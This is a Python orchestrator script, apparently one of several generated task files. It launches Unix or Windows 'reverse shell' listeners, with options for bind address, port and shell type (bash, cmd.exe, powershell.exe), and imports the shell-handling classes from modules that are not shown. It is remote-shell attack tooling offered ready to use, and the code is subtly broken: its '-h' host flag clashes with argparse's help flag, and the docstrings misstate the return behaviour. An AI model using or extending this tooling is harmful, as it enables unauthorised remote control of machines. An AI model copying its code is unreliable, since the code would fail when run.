"""Main orchestrator that wires together Unix and Windows reverse shell components."""
from TASK_001_models import ExecutionResult, ReverseShellConfig
from TASK_002_unix_reverse_shell import UnixReverseShellListener
from TASK_003_windows_reverse_shell import WindowsReverseShellListener
import argparse
import signal
import sys
from typing import Optional



def create_reverse_shell_server(
    host: str = '0.0.0.0',
    port: int = 5522,
    timeout: float = 30.0,
    shell_type: str = 'bash'
) -> Optional[UnixReverseShellListener | WindowsReverseShellListener]:
    """Create and return the appropriate reverse shell listener based on platform.

    Args:
        host: The IP address to bind the listener to. Defaults to '0.0.0.0'.
        port: The TCP port to listen on. Defaults to 5522.
        timeout: Connection timeout in seconds. Defaults to 30.0.
        shell_type: Shell type ('bash' for Unix, 'cmd.exe' or 'powershell.exe' for Windows).

    Returns:
        An instance of the appropriate listener class, or None if configuration is invalid.
    """
    config = ReverseShellConfig(
        host=host,
        port=port,
        timeout=timeout,
        shell_type=shell_type
    )

    # Determine which listener to instantiate based on shell type
    if shell_type == 'bash':
        return UnixReverseShellListener(config)
    elif shell_type in ('cmd.exe', 'powershell.exe'):
        return WindowsReverseShellListener(config)
    else:
        raise ValueError(f"Unknown shell type: {shell_type}. Use 'bash', 'cmd.exe', or 'powershell.exe'.")


def run_unix_listener(listener: UnixReverseShellListener, stop_event: Optional[bool] = None) -> ExecutionResult | None:
    """Run the Unix reverse shell listener in a loop.

    Args:
        listener: The UnixReverseShellListener instance to run.
        stop_event: Optional flag to signal immediate shutdown (for testing).

    Returns:
        An ExecutionResult for the last handled connection, or None if no clients connected.
    """
    result = None
    try:
        while True:
            if stop_event is not None and stop_event:
                break
            result = listener.run()
            if result is not None:
                print(f'Exit code: {result.exit_code}')
                print(f'Stdout:\n{result.stdout}')
                print(f'Stderr:\n{result.stderr}')
    except KeyboardInterrupt:
        pass
    return result


def run_windows_listener(listener: WindowsReverseShellListener, stop_event: Optional[bool] = None) -> ExecutionResult | None:
    """Run the Windows reverse shell listener in a loop.

    Args:
        listener: The WindowsReverseShellListener instance to run.
        stop_event: Optional flag to signal immediate shutdown (for testing).

    Returns:
        An ExecutionResult for the last handled connection, or None if no clients connected.
    """
    result = None
    try:
        while True:
            if stop_event is not None and stop_event:
                break
            result = listener.start()
            if result is not None:
                print(f'Exit code: {result.exit_code}')
                print(f'Stdout:\n{result.stdout}')
                print(f'Stderr:\n{result.stderr}')
    except KeyboardInterrupt:
        pass
    return result


def run_listener(listener: UnixReverseShellListener | WindowsReverseShellListener, stop_event: Optional[bool] = None) -> ExecutionResult | None:
    """Run the appropriate listener based on its type.

    Args:
        listener: The listener instance to run.
        stop_event: Optional flag to signal immediate shutdown (for testing).

    Returns:
        An ExecutionResult for the last handled connection, or None if no clients connected.
    """
    if isinstance(listener, UnixReverseShellListener):
        return run_unix_listener(listener, stop_event)
    elif isinstance(listener, WindowsReverseShellListener):
        return run_windows_listener(listener, stop_event)
    else:
        raise TypeError(f"Unknown listener type: {type(listener)}")


def setup_signal_handlers() -> None:
    """Set up signal handlers for graceful shutdown."""
    def handle_sigint(signum: int, frame: Optional[object]) -> None:
        print('\nReceived SIGINT (Ctrl+C). Shutting down gracefully...')
        sys.exit(0)

    def handle_sigterm(signum: int, frame: Optional[object]) -> None:
        print('Received SIGTERM. Shutting down gracefully...')
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_sigint)
    signal.signal(signal.SIGTERM, handle_sigterm)


def parse_args() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        prog='reverse_shell',
        description='Reverse shell orchestrator - wires together Unix and Windows reverse shell components.',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python __main__.py                          # Run default (Unix bash) listener on 0.0.0.0:5522
  python __main__.py --shell-type cmd.exe     # Run Windows cmd.exe listener
  python __main__.py --host 127.0.0.1         # Bind to localhost instead of all interfaces
  python __main__.py --port 4444               # Use a different port
        """
    )

    parser.add_argument(
        '--host', '-h',
        type=str,
        default='0.0.0.0',
        help='IP address to bind the listener to (default: 0.0.0.0)'
    )

    parser.add_argument(
        '--port', '-p',
        type=int,
        default=5522,
        help='TCP port to listen on (default: 5522)'
    )

    parser.add_argument(
        '--timeout', '-t',
        type=float,
        default=30.0,
        help='Connection timeout in seconds (default: 30.0)'
    )

    parser.add_argument(
        '--shell-type', '-s',
        type=str,
        default='bash',
        choices=['bash', 'cmd.exe', 'powershell.exe'],
        help='Shell type to spawn (default: bash). Use cmd.exe or powershell.exe for Windows.'
    )

    parser.add_argument(
        '--platform', '-P',
        type=str,
        default=None,
        choices=['unix', 'windows'],
        help='Explicitly choose platform. If not specified, shell-type determines it.'
    )

    return parser.parse_args()


def main() -> None:
    """Main entry point for the reverse shell orchestrator."""
    args = parse_args()

    # Set up signal handlers for graceful shutdown
    setup_signal_handlers()

    print(f'Reverse Shell Orchestrator')
    print(f'  Host:     {args.host}')
    print(f'  Port:     {args.port}')
    print(f'  Timeout:  {args.timeout}s')
    print(f'  Shell:    {args.shell_type}')

    # Create the appropriate listener based on shell type (or explicit platform)
    if args.platform == 'unix':
        listener = UnixReverseShellListener(
            ReverseShellConfig(
                host=args.host,
                port=args.port,
                timeout=args.timeout,
                shell_type='bash'
            )
        )
    elif args.platform == 'windows':
        listener = WindowsReverseShellListener(
            ReverseShellConfig(
                host=args.host,
                port=args.port,
                timeout=args.timeout,
                shell_type=args.shell_type
            )
        )
    else:
        # Default behavior: infer from shell type
        listener = create_reverse_shell_server(
            host=args.host,
            port=args.port,
            timeout=args.timeout,
            shell_type=args.shell_type
        )

    if listener is None:
        print('Error: Could not create reverse shell listener.')
        sys.exit(1)

    # Run the listener in a loop (handles multiple connections)
    result = run_listener(listener)

    if result is not None:
        print(f'Final exit code: {result.exit_code}')


if __name__ == '__main__':
    main()
